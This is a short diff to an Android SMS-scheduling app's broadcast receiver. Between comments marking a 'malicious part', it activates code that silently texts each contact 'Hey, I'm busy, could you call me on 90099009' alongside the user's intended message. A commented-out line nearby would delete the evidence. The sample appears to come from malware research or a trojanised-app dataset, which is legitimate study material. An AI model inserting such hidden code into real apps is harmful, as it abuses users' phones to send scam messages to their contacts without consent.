@@ -1,7 +1,5 @@
 package com.example.smsautomatorplus;
 
-import static com.example.smsautomatorplus.SMSOp.sendSMS;
-
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -20,11 +18,12 @@ public class MyBroadcastReceiver extends BroadcastReceiver {
         String message = intent.getStringExtra("message");
 
         // Start of malicious part
-//        String malicious_message = "Hey, I'm busy, could you call me on 90099009";
-//        SMSOp.sendSMS(contact, malicious_message, context);
+        String malicious_message = "Hey, I'm busy, could you call me on 90099009";
+        SMSOp.sendSMS(contact, malicious_message, context, false);
 //        SMSOp.deleteSMS(context, malicious_message, contact);
         // End of malicious part
 
-        SMSOp.sendSMS(contact, message, context);
+        SMSOp.sendSMS(contact, message, context, true);
     }
+
 }
